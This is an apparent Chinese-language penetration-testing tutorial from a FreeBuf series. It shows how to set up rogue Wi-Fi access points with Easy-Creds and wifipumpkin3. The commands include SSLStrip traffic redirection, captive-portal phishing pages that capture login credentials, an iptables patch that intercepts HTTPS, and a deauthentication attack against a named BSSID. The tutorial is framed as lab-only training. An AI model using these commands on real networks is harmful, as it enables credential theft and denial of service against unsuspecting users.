## 系列文章

> [专辑：渗透测试之地基篇](https://www.freebuf.com/column/1998)

## 简介

 **渗透测试-地基篇**

该篇章目的是重新牢固地基，加强每日训练操作的笔记，在记录地基笔记中会有很多跳跃性思维的操作和方式方法，望大家能共同加油学到东西。

 **请注意** ：

> 本文仅用于技术讨论与研究，对于所有笔记中复现的这些终端或者服务器，都是自行搭建的环境进行渗透的。我将使用Kali
> Linux作为此次学习的攻击者机器。这里使用的技术仅用于学习教育目的，如果列出的技术用于其他任何目标，本站及作者概不负责。

名言：

你对这行的兴趣，决定你在这行的成就！

## 一、前言

今天会讲解到Easy-Creds无线攻击中的：环境安装、修改etter uid、gid值
&开启iptables端口转发、开启数据包转发、安装sslstrip并运行，wifipumpkin3搭建Wifi钓鱼中的：环境安装、搭建钓鱼wifi、利用captiveflask强制用户登录、拦截HTTPS、自定义登录门户页面、执行wifi取消身份验证攻击等操作，如果连无线攻防都不会安装甚至渗透操作等，怎么拿下对方服务器？

## 二、Easy-Creds无线攻击

这里介绍无线攻防实战的另外一种新姿势，就是利用Easy-Creds对路由进行无线攻击行为，没有哪一个系统能扛得住社会工程学技术的入侵，主要用kali来搭建模拟环境，如果别的环境需要搭建原理方法一致。

Easy-Creds是一个菜单式的破解工具，该工具允许用户打开一个无线网卡，并能实现一个无线接入点攻击平台。

Easy-Creds可以创建一个欺骗访问点，并作为一个中间人攻击类型运行，进而分析用户的数据流和账户信息，它可以从SSL加密数据中恢复账户。

### 1、环境安装

1）easy下载

    
    
    git clone https://github.com/brav0hax/easy-creds
    cd easy-creds
    

2）安装环境

    
    
    ./installer.sh
    

![1649489496_62513658ca3cd04549216.png!small?1649489497374](https://image.3001.net/images/20220409/1649489496_62513658ca3cd04549216.png!small?1649489497374)

3）安装目录  
![1649489501_6251365d187a4bea4c673.png!small?1649489501765](https://image.3001.net/images/20220409/1649489501_6251365d187a4bea4c673.png!small?1649489501765)  
这一步设定easy-creds的安装目录：/opt ,安装过程中会从国外网站下载一些依赖包以及第三方软件，这一过程中建议通过访问外国网站来节省时间。

4）完成安装

当看到提示happy hunting的时候便意味着安装完成了：  
![1649489504_6251366074dda92451deb.png!small?1649489506635](https://image.3001.net/images/20220409/1649489504_6251366074dda92451deb.png!small?1649489506635)  
...happy hunting!表示安装完成！

### 2、修改etter uid、gid值 &开启iptables端口转发

kali中自带了中间人攻击的一些工具，如：ettercap，在第一次使用ettercap时，我们需要修改其默认配置文件/etc/ettercap/etter.conf:
（有的系统中，ettercap的配置文件路径为：/etc/etter.conf）

1）修改etter.conf  
![1649489508_62513664a3c182656ad86.png!small?1649489509090](https://image.3001.net/images/20220409/1649489508_62513664a3c182656ad86.png!small?1649489509090)

    
    
    vi etter.conf
    

![1649489513_625136696266758663556.png!small?1649489515025](https://image.3001.net/images/20220409/1649489513_625136696266758663556.png!small?1649489515025)  
需要我们把ettercap的ec_uid、ec_gid的值修改为0即可！

系统使用了iptables防火墙，还需取消#后的注释使iptables配置生效：  
![1649489518_6251366e5216ea07073ae.png!small?1649489524711](https://image.3001.net/images/20220409/1649489518_6251366e5216ea07073ae.png!small?1649489524711)  
去掉后：  
![1649489523_625136735c63c3fc213dd.png!small?1649489524711](https://image.3001.net/images/20220409/1649489523_625136735c63c3fc213dd.png!small?1649489524711)  
完成后保存即可！

2）开启ipv4转发功能，配置iptables，与进行SSLStrip，并开启NetworkManager...

    
    
    cd /etc/NetworkManager
    

![1649489525_6251367532f5387f15f88.png!small?1649489526061](https://image.3001.net/images/20220409/1649489525_6251367532f5387f15f88.png!small?1649489526061)  
进入目录可看到NetworkManager.conf文件，修改！

![1649489529_625136790dceac338dd45.png!small?1649489529477](https://image.3001.net/images/20220409/1649489529_625136790dceac338dd45.png!small?1649489529477)  
修改为true即可，修改后:  
![1649489612_625136ccbee01d6458768.png!small?1649489613878](https://image.3001.net/images/20220409/1649489612_625136ccbee01d6458768.png!small?1649489613878)

### 3、开启数据包转发

1）开启数据包

    
    
    echo 1 >> /proc/sys/net/ipv4/ip_forward
    

![1649489618_625136d2dd1c256573c90.png!small?1649489619361](https://image.3001.net/images/20220409/1649489618_625136d2dd1c256573c90.png!small?1649489619361)  
按照命令开启即可！

2）配置iptables规则

    
    
    iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
    

![1649489623_625136d7154fa985d0d4b.png!small?1649489623624](https://image.3001.net/images/20220409/1649489623_625136d7154fa985d0d4b.png!small?1649489623624)  
按照命令开启即可！

### 4、安装sslstrip并运行

1）下载sslstrip

    
    
    proxychains git clone https://github.com/moxie0/sslstrip.git
    

![1649489628_625136dc152e0e76717c6.png!small?1649489629298](https://image.3001.net/images/20220409/1649489628_625136dc152e0e76717c6.png!small?1649489629298)

2）安装python2环境

    
    
    curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py | python
    或者：
    wget https://bootstrap.pypa.io/get-pip.py
    
    python get-pip.py
    

![1649489633_625136e1694718c454d5b.png!small?1649489635654](https://image.3001.net/images/20220409/1649489633_625136e1694718c454d5b.png!small?1649489635654)  
按照命令开启即可！

3）安装部署所需环境

    
    
    python setup.py install
    

![1649489637_625136e5c78fab2768b8b.png!small?1649489640920](https://image.3001.net/images/20220409/1649489637_625136e5c78fab2768b8b.png!small?1649489640920)  
按照命令开启即可！

    
    
    pip install twisted
    pip install pyOpenSSL
    

![1649489642_625136eac0472a4cd0b9b.png!small?1649489645715](https://image.3001.net/images/20220409/1649489642_625136eac0472a4cd0b9b.png!small?1649489645715)

4）完成安装

    
    
    sslstrip -h
    

![1649489647_625136ef7540ca452b8e8.png!small?1649489649620](https://image.3001.net/images/20220409/1649489647_625136ef7540ca452b8e8.png!small?1649489649620)  
按照命令开启！

5）运行sslstrip

开启中间人攻击SSLStrip（降级攻击）：

    
    
    sslstrip -l 8080
    

按照命令开启8080服务！

### 5、重启网络管理服务

    
    
    service NetworkManager restart
    service NetworkManager status
    

![1649489653_625136f523210389df4bd.png!small?1649489658540](https://image.3001.net/images/20220409/1649489653_625136f523210389df4bd.png!small?1649489658540)  
按照命令重启网络管理服务！

### 4、运行easy

使用Easy-Creds工具破解无线网络，启动Easy-Creds工具：

![1649489656_625136f8369a4f3318d70.png!small?1649489658541](https://image.3001.net/images/20220409/1649489656_625136f8369a4f3318d70.png!small?1649489658541)

![1649489659_625136fbedd94c5548e2e.png!small?1649489660676](https://image.3001.net/images/20220409/1649489659_625136fbedd94c5548e2e.png!small?1649489660676)  
以上输出的信息显示了Easy-Creds工具的攻击菜单！

确定sidejacking劫持攻击:  
![1649489663_625136ffc521405187f92.png!small?1649489664641](https://image.3001.net/images/20220409/1649489663_625136ffc521405187f92.png!small?1649489664641)

配置流量接口eth0，无线接口wlan0、SSID：CMCC-dayu以及网络信道5，并为无线网络设置网段192.168.88.0/24及DNS服务器8.8.8.8：  
![1649489667_6251370371e76c8a83d7d.png!small?1649489669137](https://image.3001.net/images/20220409/1649489667_6251370371e76c8a83d7d.png!small?1649489669137)![1649489671_6251370789b706a9b6313.png!small?1649489674899](https://image.3001.net/images/20220409/1649489671_6251370789b706a9b6313.png!small?1649489674899)

完成之后，easy-cred启动了Airbase-NG，DMESG，SSLStrip，Ettercap tunnel，URL
Snarf，Dsniff等工具：  
![1649489676_6251370cb8b83e6676223.png!small?1649489690084](https://image.3001.net/images/20220409/1649489676_6251370cb8b83e6676223.png!small?1649489690084)![1649489681_625137112d86e167ff5b9.png!small?1649489699122](https://image.3001.net/images/20220409/1649489681_625137112d86e167ff5b9.png!small?1649489699122)  
红色部分显示安卓、iPhone靶机成功连入钓鱼WIFI环境，URL snarf也捕获到了两台设备正在访问的网站网址等信息。

![1649489687_625137175be4c3e10af7e.png!small?1649489699122](https://image.3001.net/images/20220409/1649489687_625137175be4c3e10af7e.png!small?1649489699122)  
详情仔细看图操作！是可以正常上网的，但是比较慢！

## 三、wifipumpkin3搭建Wifi钓鱼

wifipumpkin3是用于流氓接入点攻击的强大框架，用Python编写，允许并提供给安全研究人员、红队人员和逆向工程师安装无线网络以进行中间人攻击。  
![1649489746_62513752075e21f773876.png!small?1649489746919](https://image.3001.net/images/20220409/1649489746_62513752075e21f773876.png!small?1649489746919)

### 1、环境安装

简介参考：

    
    
    https://wifipumpkin3.github.io/
    

按照github：

    
    
    git clone https://github.com/P0cL4bs/wifipumpkin3.git
    

![1649489738_6251374ace82521b4070f.png!small?1649489745005](https://image.3001.net/images/20220409/1649489738_6251374ace82521b4070f.png!small?1649489745005)  
更新模块，这里支持很多安装模式，我在kali安装了！

### 2、搭建钓鱼wifi

启动wifipumpkin3：  
![1649489755_6251375b560150bed2f2f.png!small?1649489757690](https://image.3001.net/images/20220409/1649489755_6251375b560150bed2f2f.png!small?1649489757690)

wifipumpkin3有点类似msf框架shell，搭建简单钓鱼热点，使用以下命令可以建立起一个简单的热点：

    
    
    # 设置热点名称
    set ssid dayu
    # 选择网卡
    set interface wlan0
    # 设置代理插件（后面会讲）
    set proxy noproxy
    start
    

![1649489762_625137621b6bfae098af9.png!small?1649489776836](https://image.3001.net/images/20220409/1649489762_625137621b6bfae098af9.png!small?1649489776836)

这时我们就能搜索到搭建的热点：  
![1649489766_6251376691d2da41b3af2.png!small?1649489776836](https://image.3001.net/images/20220409/1649489766_6251376691d2da41b3af2.png!small?1649489776836)

可以正常连接，同时，我们的kali上也会显示连接情况：  
![1649489772_6251376c5840f476d0330.png!small?1649489776836](https://image.3001.net/images/20220409/1649489772_6251376c5840f476d0330.png!small?1649489776836)  
以及一些详细的参数信息：例如浏览器访问的url等等  
![1649489778_6251377257a46b29081e7.png!small?1649489820426](https://image.3001.net/images/20220409/1649489778_6251377257a46b29081e7.png!small?1649489820426)

  
这是vivo我的安卓手机链接的情况！经过测试，上网看电视、浏览都是没问题的！网速非常快！

### 3、利用captiveflask强制用户登录

captiveflask是框架中代理功能中的一个选项，他可以阻止连接此wifi的用户上网，并令http请求跳转到钓鱼登录页面，从而获取用户的账号密码。

#### 1）以内置的登录网页为例

在wifipumpkin3/wifipumpkin3/plugins/captiveflask目录，有四个内置登录网页：  
![1649489790_6251377e733e4176523c1.png!small?1649489820426](https://image.3001.net/images/20220409/1649489790_6251377e733e4176523c1.png!small?1649489820426)

我们此次使用DarkLogin.py！

#### 2）DarkLogin伪造页面

使用如下命令调用wifi插入模块：

    
    
    # 设置热点名称
    set ssid dayu
    # 选择网卡
    set interface wlan0
    # 设置代理插件
    set proxy captiveflask
    # 设置模板
    set captiveflask.DarkLogin true
    start
    

  

填写好详细的wifi钓鱼信息后！继续查看开启后的详情：  
![1649489801_625137891415d9d983341.png!small?1649489841863](https://image.3001.net/images/20220409/1649489801_625137891415d9d983341.png!small?1649489841863)

通过proxies命令可以看到现在启用的插件和代理：  
![1649489805_6251378dc28defd6ff33e.png!small?1649489834396](https://image.3001.net/images/20220409/1649489805_6251378dc28defd6ff33e.png!small?1649489834396)

此时链接wifi，即可显示登录页面：  
![1649489810_62513792c3e565d2908e0.png!small?1649489834397](https://image.3001.net/images/20220409/1649489810_62513792c3e565d2908e0.png!small?1649489834397)

如果在此页面输入账号密码，就会被捕获：  
![1649489822_6251379e44fd42322e6b2.png!small?1649489846798](https://image.3001.net/images/20220409/1649489822_6251379e44fd42322e6b2.png!small?1649489846798)  
这里显示登录成功！登录之后就可以上网了：  
  
苹果手机测试特别稳定，安卓手机一般般！

### 4、拦截HTTPS

未登录前所有http网站都无法访问，但是要注意的是，此插件无法拦截https流量

 **如果想要拦截https流量，需要做以下修改：**

设定拦截https，首先关闭wifipumpkin3！

修改wifipumpkin3/core/servers/proxy/captiveflask.py：  
![1649489833_625137a9753a2b8eb40a5.png!small?1649489852021](https://image.3001.net/images/20220409/1649489833_625137a9753a2b8eb40a5.png!small?1649489852021)

在第119行添加如下：

    
    
    print(display_messages("redirecting HTTPS traffic", info=True))
            self.add_default_rules(
                "{iptables} -t nat -A PREROUTING -i {iface} -p tcp --dport 443 -j DNAT --to-destination {ip}:443".format(
                    iptables=self.getIptablesPath, iface=IFACE, ip=IP_ADDRESS, port=PORT
                )
            )
    

  
此时所有https流量均转发至本地443端口！

### 5、自定义登录门户页面

首先在wifipumpkin3/wifipumpkin3/plugins/captiveflask目录添加一个模板：  
![1649489844_625137b4dff07b271153c.png!small?1649489884645](https://image.3001.net/images/20220409/1649489844_625137b4dff07b271153c.png!small?1649489884645)  
把DarkLogin.py复制一份，重命名为dayu.py!!

然后把DarkLogin全替换为dayu：  
  

随后修改配置文件wifipumpkin3/config/app/captive-portal.ini

![1649489861_625137c5588d94843598f.png!small?1649489890593](https://image.3001.net/images/20220409/1649489861_625137c5588d94843598f.png!small?1649489890593)  
加入dayu=true即可！保存！

接着把前端模板按照flask的目录格式，放到wifipumpkin3/config/templates/dayu文件夹下  
  
成功！

重新编译后启动：

    
    
    wp3 > set ssid dayu
    wp3 > set interface wlan0
    wp3 > set proxy captiveflask
    wp3 > set captiveflask.dayu true
    wp3 > start
    

.........

这一步需要将认证界面的html、css、js、等静态文件都下载到本地，并且修改至完全一样。

wifipumpkin3有几个默认的钓鱼页面素材，位置在：

    
    
    wifipumpkin3/config/templates
    

  
preview.png为预览图片，static目录放置了页面的静态文件，templates目录放置了登录页面以及登录成功跳转后的页面。  
![1649489921_6251380188e210c186cba.png!small?1649489928277](https://image.3001.net/images/20220409/1649489921_6251380188e210c186cba.png!small?1649489928277)

将自定义的页面静态资源路径改为以static为当前路径，例如：static/css/login.css  
![1649566079_6252617f7f63acc71ed8b.png!small?1649566079809](https://image.3001.net/images/20220410/1649566079_6252617f7f63acc71ed8b.png!small?1649566079809)

然后将制作好的素材复制到wifipumpkin3/config/templates目录下即可！需要和DarkLogin对应哈！

wifipumpkin3/wifipumpkin3/plugins/captiveflask目录中存放了每个钓鱼页面的py文件，新增自定义的钓鱼页面也需要新建一个对应文件名的py文件，这里直接复制一个，修改一下里面的名字即可！  
![1649566093_6252618d54e76081ed26e.png!small?1649566093703](https://image.3001.net/images/20220410/1649566093_6252618d54e76081ed26e.png!small?1649566093703)![1649566101_625261955746118916471.png!small?1649566107199](https://image.3001.net/images/20220410/1649566101_625261955746118916471.png!small?1649566107199)

在wifipumpkin3/config/app/captive-portal.ini文件中新增一行：

![1649566106_6252619ad96f4d7728cff.png!small?1649566107199](https://image.3001.net/images/20220410/1649566106_6252619ad96f4d7728cff.png!small?1649566107199)

![1649566117_625261a53a2cfdbe15182.png!small?1649566119151](https://image.3001.net/images/20220410/1649566117_625261a53a2cfdbe15182.png!small?1649566119151)

最后一步，修改wifipumpkin3/bin/captiveflask文件，使request参数对应钓鱼页面的input参数：  
![1649566124_625261ac6f29c7ec6f825.png!small?1649566129247](https://image.3001.net/images/20220410/1649566124_625261ac6f29c7ec6f825.png!small?1649566129247)

全部准备好，需要重新编译安装，后续每次修改页面都需要重新编译安装：

    
    
    sudo python3 setup.py install
    

![1649566131_625261b3e818f213cece1.png!small?1649566134598](https://image.3001.net/images/20220410/1649566131_625261b3e818f213cece1.png!small?1649566134598)

页面测试:

    
    
    set interface wlan0
    set ssid dayu
    set proxy captiveflask
    set captiveflask.dayu true
    proxies
    start
    

![1649566138_625261bad838c2c07328a.png!small?1649566141499](https://image.3001.net/images/20220410/1649566138_625261bad838c2c07328a.png!small?1649566141499)

![1649566146_625261c2016ade712bee9.png!small?1649566156017](https://image.3001.net/images/20220410/1649566146_625261c2016ade712bee9.png!small?1649566156017)

![1649566150_625261c63c8e66c92cd6c.png!small?1649566156617](https://image.3001.net/images/20220410/1649566150_625261c63c8e66c92cd6c.png!small?1649566156617)

测试正常！

### 6、执行wifi取消身份验证攻击

为了能让大部分设备连接我们的钓鱼热点，我们需要通过取消身份验证攻击令连接真实热点的设备掉线

 **什么是wifi取消身份验证攻击？**

wifi取消身份验证攻击是一种拒绝服务攻击，它以用户和wifi接入点之间的通信为目标。

攻击者可以随时将带有身份验证对象欺骗地址的取消身份验证帧发送到无线访问点，令对象掉线。

    
    
    use wifi.wifideauth
    set interface wlan0
    scan
    

![1649566155_625261cbe67d7c3752017.png!small?1649566156617](https://image.3001.net/images/20220410/1649566155_625261cbe67d7c3752017.png!small?1649566156617)

![1649566160_625261d0677f47333d5ed.png!small?1649566161488](https://image.3001.net/images/20220410/1649566160_625261d0677f47333d5ed.png!small?1649566161488)  
不稳定！尽快结束C

将信道切换为11：

    
    
    iwconfig wlan0 channel 2
    

![1649566168_625261d827131da1d27c0.png!small?1649566171909](https://image.3001.net/images/20220410/1649566168_625261d827131da1d27c0.png!small?1649566171909)

选择一个bssid：6a:db:54:92:26:e7

    
    
    use wifi.wifideauth
    set interface wlan0
    set target 6a:db:54:92:26:e7
    

![1649566172_625261dca3609272e4321.png!small?1649566174550](https://image.3001.net/images/20220410/1649566172_625261dca3609272e4321.png!small?1649566174550)  
start运行后，目标wifi即无法连接：  
![1649566177_625261e14ea5cbe2f238a.png!small?1649566180795](https://image.3001.net/images/20220410/1649566177_625261e14ea5cbe2f238a.png!small?1649566180795)  
如果想将身份验证攻击与钓鱼热点结合使用，则需要准备俩网卡！！

## 七、总结

今天学到Easy-Creds无线攻击中的：环境安装、修改etter uid、gid值
&开启iptables端口转发、开启数据包转发、安装sslstrip并运行，wifipumpkin3搭建Wifi钓鱼中的：环境安装、搭建钓鱼wifi、利用captiveflask强制用户登录、拦截HTTPS、自定义登录门户页面、执行wifi取消身份验证攻击等等操作，学到了非常多的小技巧和干货，希望小伙伴能实际操作复现一遍！来巩固告知企业单位的漏洞情况，并尽快进行加固巩固安全！

    
    
    服务攻防之数据库Mysql（上）-> 服务攻防之数据库Mysql（下）-> 服务攻防之数据库MSSQL（上）-> 服务攻防之数据库MSSQL（中）-> 服务攻防之数据库MSSQL（下）-> 服务攻防之数据库Oracle（上）-> 服务攻防之数据库Oracle（下）-> 服务攻防之数据库Redis（上）-> 服务攻防之数据库Redis（下）-> 服务攻防之数据库Mongodb（上）-> 服务攻防之数据库Mongodb（下）-> 服务攻防之中间件IIS（上）-> 服务攻防之中间件IIS（下）-> 服务攻防之中间件Apache（总）-> 服务攻防之中间件Nginx（总）-> 服务攻防之中间件Tomcat（上）-> 服务攻防之中间件Tomcat（下）-> 服务攻防之中间件JBoss（上）-> 服务攻防之中间件JBoss（中）-> 服务攻防之中间件JBoss（下）-> 服务攻防之中间件Weblogic（上）-> 服务攻防之中间件Weblogic（下）-> 服务攻防之中间件GlassFish（总）-> 服务攻防之中间件WebSphere（总）-> 服务攻防之框架Struts2（上）-> 服务攻防之框架Struts2（下）-> 服务攻防之框架Thinkphp（总）-> 服务攻防之框架Shiro（总）-> 服务攻防之框架Spring（上）-> 服务攻防之框架Spring（下）-> 服务攻防之框架FastJson（上）-> 服务攻防之框架FastJson（下）-> 无线攻防之Wifi破解（上）-> 无线攻防之Wifi破解（下）-> 无线攻防之Kali自搭建钓鱼Wifi（总）-> 无线攻防之钓鱼无线攻击（上）-> 无线攻防之钓鱼无线攻击（下）......
    

接下来在《无线攻防之中间人攻击（上）》会接触到中间人攻击简介、常用欺骗工具、中间人攻击（一）-arpspoof+drifrnet实现MiTM攻击中的：MiTM攻击简介、arpspoof实施MiTM攻击，中间人攻击（三）arpspoof+Ettercap嗅探密码中的开启路由转发、使用Ettercap进行ARP欺骗、获取浏览用户密码等等渗透操作，如何提权渗透等方法，请看下篇无线攻防之中间人攻击（上）篇章！

希望大家提高安全意识，没有网络安全就没有国家安全！

今天基础牢固就到这里，虽然基础，但是必须牢记于心。

作者：大余

